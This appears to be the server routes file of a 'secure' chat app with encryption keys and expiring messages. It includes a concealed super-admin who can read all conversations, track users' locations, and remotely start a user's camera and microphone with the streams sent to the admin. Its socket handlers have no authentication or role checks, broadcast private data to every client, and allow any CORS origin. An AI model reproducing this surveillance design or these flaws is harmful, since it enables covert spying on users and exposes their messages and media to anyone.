import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { Server as SocketIOServer } from "socket.io";
import { storage } from "./storage";
import { setupAuth, isAuthenticated, isSuperAdmin } from "./auth";
import { ObjectStorageService, ObjectNotFoundError } from "./objectStorage";
import { ObjectPermission } from "./objectAcl";
import { loginSchema, insertUserSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  setupAuth(app);

  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      const { username, password } = loginSchema.parse(req.body);
      const user = await storage.getUserByUsername(username);
      
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      
      const isValid = await storage.validatePassword(user, password);
      if (!isValid) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      
      req.session.userId = user.id;
      await storage.updateUser(user.id, { isOnline: true, lastSeen: new Date() });
      
      const { password: _, ...userWithoutPassword } = user;
      res.json({ user: userWithoutPassword });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Invalid input", details: error.errors });
      }
      console.error("Login error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/auth/logout", isAuthenticated, async (req: Request, res: Response) => {
    if (req.user) {
      await storage.updateUser(req.user.id, { isOnline: false, lastSeen: new Date() });
    }
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ error: "Failed to logout" });
      }
      res.json({ success: true });
    });
  });

  app.get("/api/auth/me", isAuthenticated, (req: Request, res: Response) => {
    const { password: _, ...userWithoutPassword } = req.user!;
    res.json({ user: userWithoutPassword });
  });

  app.get("/api/users", isAuthenticated, async (req: Request, res: Response) => {
    const users = await storage.getAllUsers();
    const usersWithoutPasswords = users
      .filter(u => u.id !== req.user!.id && u.role !== "super_admin")
      .map(({ password: _, ...user }) => user);
    res.json(usersWithoutPasswords);
  });

  app.post("/api/admin/users", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        return res.status(400).json({ error: "Username already exists" });
      }
      const user = await storage.createUser(userData);
      const { password: _, ...userWithoutPassword } = user;
      res.status(201).json(userWithoutPassword);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Invalid input", details: error.errors });
      }
      console.error("Create user error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.get("/api/admin/users", isAuthenticated, isSuperAdmin, async (_req: Request, res: Response) => {
    const users = await storage.getAllUsers();
    const usersWithoutPasswords = users.map(({ password: _, ...user }) => user);
    res.json(usersWithoutPasswords);
  });

  app.put("/api/admin/users/:id", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
    const { id } = req.params;
    const updates = req.body;
    delete updates.id;
    
    const user = await storage.updateUser(id, updates);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    const { password: _, ...userWithoutPassword } = user;
    res.json(userWithoutPassword);
  });

  app.delete("/api/admin/users/:id", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
    const { id } = req.params;
    const deleted = await storage.deleteUser(id);
    if (!deleted) {
      return res.status(404).json({ error: "User not found" });
    }
    res.json({ success: true });
  });

  app.get("/api/admin/locations", isAuthenticated, isSuperAdmin, async (_req: Request, res: Response) => {
    const locations = await storage.getUserLocations();
    res.json(locations.map(({ user, latitude, longitude }) => ({
      user: { id: user.id, displayName: user.displayName, username: user.username, isOnline: user.isOnline },
      latitude,
      longitude,
      lastUpdate: user.lastLocationUpdate,
    })));
  });

  app.get("/api/admin/conversations", isAuthenticated, isSuperAdmin, async (_req: Request, res: Response) => {
    const conversations = await storage.getAllConversationsWithDetails();
    res.json(conversations.map(conv => ({
      id: conv.id,
      participant1: {
        id: conv.participant1.id,
        displayName: conv.participant1.displayName,
        username: conv.participant1.username,
        isOnline: conv.participant1.isOnline,
      },
      participant2: {
        id: conv.participant2.id,
        displayName: conv.participant2.displayName,
        username: conv.participant2.username,
        isOnline: conv.participant2.isOnline,
      },
      lastMessage: conv.lastMessage ? {
        id: conv.lastMessage.id,
        type: conv.lastMessage.type,
        content: conv.lastMessage.content,
        expiryType: conv.lastMessage.expiryType,
        createdAt: conv.lastMessage.createdAt,
        senderId: conv.lastMessage.senderId,
        isViewed: conv.lastMessage.isViewed,
      } : null,
      lastMessageAt: conv.lastMessageAt,
      messageCount: conv.messageCount,
    })));
  });

  app.get("/api/admin/conversations/:id/messages", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
    const { id } = req.params;
    const conversation = await storage.getConversation(id);
    
    if (!conversation) {
      return res.status(404).json({ error: "Conversation not found" });
    }
    
    const messages = await storage.getAllMessagesForConversation(id);
    res.json(messages);
  });

  app.post("/api/location", isAuthenticated, async (req: Request, res: Response) => {
    const { latitude, longitude } = req.body;
    if (typeof latitude !== "number" || typeof longitude !== "number") {
      return res.status(400).json({ error: "Invalid location data" });
    }
    await storage.updateUserLocation(req.user!.id, latitude, longitude);
    res.json({ success: true });
  });

  app.get("/api/conversations", isAuthenticated, async (req: Request, res: Response) => {
    const conversations = await storage.getConversationsForUser(req.user!.id);
    res.json(conversations.map(conv => ({
      id: conv.id,
      otherUser: {
        id: conv.otherUser.id,
        displayName: conv.otherUser.displayName,
        username: conv.otherUser.username,
        isOnline: conv.otherUser.isOnline,
      },
      lastMessage: conv.lastMessage ? {
        id: conv.lastMessage.id,
        type: conv.lastMessage.type,
        content: conv.lastMessage.content,
        expiryType: conv.lastMessage.expiryType,
        createdAt: conv.lastMessage.createdAt,
        senderId: conv.lastMessage.senderId,
        isViewed: conv.lastMessage.isViewed,
      } : null,
      lastMessageAt: conv.lastMessageAt,
    })));
  });

  app.post("/api/conversations", isAuthenticated, async (req: Request, res: Response) => {
    const { userId } = req.body;
    if (!userId) {
      return res.status(400).json({ error: "userId is required" });
    }
    
    let conversation = await storage.getConversationByParticipants(req.user!.id, userId);
    if (!conversation) {
      conversation = await storage.createConversation(req.user!.id, userId);
    }
    res.json(conversation);
  });

  app.get("/api/conversations/:id/messages", isAuthenticated, async (req: Request, res: Response) => {
    const { id } = req.params;
    const conversation = await storage.getConversation(id);
    
    if (!conversation) {
      return res.status(404).json({ error: "Conversation not found" });
    }
    
    if (conversation.participant1Id !== req.user!.id && conversation.participant2Id !== req.user!.id) {
      return res.status(403).json({ error: "Access denied" });
    }
    
    await storage.deleteExpiredMessages();
    const messages = await storage.getMessages(id);
    res.json(messages);
  });

  app.post("/api/conversations/:id/messages", isAuthenticated, async (req: Request, res: Response) => {
    const { id } = req.params;
    const { type, content, imageUrl, expiryType, ciphertext, nonce, senderPublicKey, isEncrypted } = req.body;
    
    const conversation = await storage.getConversation(id);
    if (!conversation) {
      return res.status(404).json({ error: "Conversation not found" });
    }
    
    if (conversation.participant1Id !== req.user!.id && conversation.participant2Id !== req.user!.id) {
      return res.status(403).json({ error: "Access denied" });
    }
    
    const message = await storage.createMessage({
      conversationId: id,
      senderId: req.user!.id,
      type: type || "text",
      content: isEncrypted ? null : content,
      imageUrl,
      expiryType: expiryType || "permanent",
      ciphertext: isEncrypted ? ciphertext : undefined,
      nonce: isEncrypted ? nonce : undefined,
      senderPublicKey: isEncrypted ? senderPublicKey : undefined,
      isEncrypted: isEncrypted || false,
    } as any);
    
    io.to(`conversation:${id}`).emit("new_message", message);
    
    res.status(201).json(message);
  });

  app.put("/api/messages/:id/view", isAuthenticated, async (req: Request, res: Response) => {
    const { id } = req.params;
    const message = await storage.markMessageAsViewed(id);
    if (!message) {
      return res.status(404).json({ error: "Message not found" });
    }
    res.json(message);
  });

  app.get("/api/keys/:userId", isAuthenticated, async (req: Request, res: Response) => {
    const { userId } = req.params;
    const key = await storage.getUserKey(userId);
    if (!key) {
      return res.status(404).json({ error: "Public key not found" });
    }
    res.json({ publicKey: key.publicKey });
  });

  app.post("/api/keys", isAuthenticated, async (req: Request, res: Response) => {
    const { publicKey } = req.body;
    if (!publicKey || typeof publicKey !== "string") {
      return res.status(400).json({ error: "publicKey is required" });
    }
    const key = await storage.setUserKey(req.user!.id, publicKey);
    res.json({ publicKey: key.publicKey });
  });

  app.get("/api/keys", isAuthenticated, async (req: Request, res: Response) => {
    const key = await storage.getUserKey(req.user!.id);
    if (!key) {
      return res.status(404).json({ error: "Public key not found" });
    }
    res.json({ publicKey: key.publicKey });
  });

  app.post("/api/security-events", isAuthenticated, async (req: Request, res: Response) => {
    const { eventType, details } = req.body;
    const validTypes = ["screenshot_attempt", "screen_recording_detected", "login_failed", "suspicious_activity"];
    if (!eventType || !validTypes.includes(eventType)) {
      return res.status(400).json({ error: "Invalid event type" });
    }
    const event = await storage.createSecurityEvent({
      userId: req.user!.id,
      eventType,
      details,
      ipAddress: req.ip || req.socket.remoteAddress,
      userAgent: req.headers["user-agent"],
    });
    res.status(201).json(event);
  });

  app.get("/api/admin/security-events", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
    const limit = parseInt(req.query.limit as string) || 100;
    const events = await storage.getSecurityEvents(limit);
    res.json(events);
  });

  app.post("/api/objects/upload", isAuthenticated, async (_req: Request, res: Response) => {
    const objectStorageService = new ObjectStorageService();
    const uploadURL = await objectStorageService.getObjectEntityUploadURL();
    res.json({ uploadURL });
  });

  app.put("/api/images", isAuthenticated, async (req: Request, res: Response) => {
    if (!req.body.imageURL) {
      return res.status(400).json({ error: "imageURL is required" });
    }

    try {
      const objectStorageService = new ObjectStorageService();
      const objectPath = await objectStorageService.trySetObjectEntityAclPolicy(
        req.body.imageURL,
        {
          owner: req.user!.id,
          visibility: "public",
        },
      );

      res.status(200).json({ objectPath });
    } catch (error) {
      console.error("Error setting image:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.get("/objects/:objectPath(*)", async (req: Request, res: Response) => {
    const objectStorageService = new ObjectStorageService();
    try {
      const objectFile = await objectStorageService.getObjectEntityFile(req.path);
      const canAccess = await objectStorageService.canAccessObjectEntity({
        objectFile,
        userId: req.user?.id,
        requestedPermission: ObjectPermission.READ,
      });
      if (!canAccess) {
        const aclPolicy = await import("./objectAcl").then(m => m.getObjectAclPolicy(objectFile));
        if (!aclPolicy || aclPolicy.visibility !== "public") {
          return res.sendStatus(401);
        }
      }
      objectStorageService.downloadObject(objectFile, res);
    } catch (error) {
      console.error("Error checking object access:", error);
      if (error instanceof ObjectNotFoundError) {
        return res.sendStatus(404);
      }
      return res.sendStatus(500);
    }
  });

  app.get("/public-objects/:filePath(*)", async (req: Request, res: Response) => {
    const filePath = req.params.filePath;
    const objectStorageService = new ObjectStorageService();
    try {
      const file = await objectStorageService.searchPublicObject(filePath);
      if (!file) {
        return res.status(404).json({ error: "File not found" });
      }
      objectStorageService.downloadObject(file, res);
    } catch (error) {
      console.error("Error searching for public object:", error);
      return res.status(500).json({ error: "Internal server error" });
    }
  });

  const httpServer = createServer(app);
  
  const io = new SocketIOServer(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"],
      credentials: true,
    },
    transports: ["websocket", "polling"],
  });

  io.on("connection", (socket) => {
    console.log("Socket connected:", socket.id);

    socket.on("join_conversation", (conversationId: string) => {
      socket.join(`conversation:${conversationId}`);
    });

    socket.on("leave_conversation", (conversationId: string) => {
      socket.leave(`conversation:${conversationId}`);
    });

    socket.on("admin_request_camera", (data: { userId: string; cameraType: string }) => {
      console.log("Admin requesting camera from user:", data.userId, data.cameraType);
      io.emit(`camera_request:${data.userId}`, { cameraType: data.cameraType });
    });

    socket.on("admin_request_microphone", (data: { userId: string }) => {
      console.log("Admin requesting microphone from user:", data.userId);
      io.emit(`microphone_request:${data.userId}`, {});
    });

    socket.on("admin_stop_camera", (data: { userId: string }) => {
      console.log("Admin stopping camera for user:", data.userId);
      io.emit(`camera_stop:${data.userId}`, {});
    });

    socket.on("admin_stop_microphone", (data: { userId: string }) => {
      console.log("Admin stopping microphone for user:", data.userId);
      io.emit(`microphone_stop:${data.userId}`, {});
    });

    socket.on("camera_stream", (data: { adminId: string; frame: string; userId?: string }) => {
      console.log("Receiving camera stream from user:", data.userId);
      io.emit(`camera_stream:${data.adminId}`, { frame: data.frame, userId: data.userId });
    });

    socket.on("audio_stream", (data: { adminId: string; audio?: string; isRecording?: boolean; userId?: string }) => {
      console.log("Receiving audio stream from user:", data.userId);
      io.emit(`audio_stream:${data.adminId}`, { audio: data.audio, isRecording: data.isRecording, userId: data.userId });
    });

    socket.on("call_initiate", async (data: { callerId: string; receiverId: string; callerName: string }) => {
      console.log("Call initiated from", data.callerId, "to", data.receiverId);
      const callLog = await storage.createCallLog(data.callerId, data.receiverId);
      io.emit(`incoming_call:${data.receiverId}`, { 
        callId: callLog.id, 
        callerId: data.callerId, 
        callerName: data.callerName 
      });
      socket.emit("call_created", { callId: callLog.id });
    });

    socket.on("call_accept", async (data: { callId: string; receiverId: string }) => {
      console.log("Call accepted:", data.callId);
      await storage.updateCallLog(data.callId, { status: "active", answeredAt: new Date() });
      const callLog = await storage.getCallLog(data.callId);
      if (callLog) {
        io.emit(`call_accepted:${callLog.callerId}`, { callId: data.callId, receiverId: data.receiverId });
      }
    });

    socket.on("call_reject", async (data: { callId: string; receiverId: string }) => {
      console.log("Call rejected:", data.callId);
      await storage.updateCallLog(data.callId, { status: "rejected", endedAt: new Date() });
      const callLog = await storage.getCallLog(data.callId);
      if (callLog) {
        io.emit(`call_rejected:${callLog.callerId}`, { callId: data.callId });
      }
    });

    socket.on("call_end", async (data: { callId: string; endedBy: string }) => {
      console.log("Call ended:", data.callId);
      const callLog = await storage.getCallLog(data.callId);
      if (callLog) {
        const duration = callLog.answeredAt 
          ? Math.floor((Date.now() - callLog.answeredAt.getTime()) / 1000) 
          : 0;
        await storage.updateCallLog(data.callId, { status: "ended", endedAt: new Date(), duration });
        const otherUserId = data.endedBy === callLog.callerId ? callLog.receiverId : callLog.callerId;
        io.emit(`call_ended:${otherUserId}`, { callId: data.callId, endedBy: data.endedBy });
      }
    });

    socket.on("call_audio", (data: { callId: string; senderId: string; receiverId: string; audioData: string }) => {
      io.emit(`call_audio:${data.receiverId}`, { 
        callId: data.callId, 
        senderId: data.senderId, 
        audioData: data.audioData 
      });
    });

    socket.on("disconnect", () => {
      console.log("Socket disconnected:", socket.id);
    });
  });

  return httpServer;
}
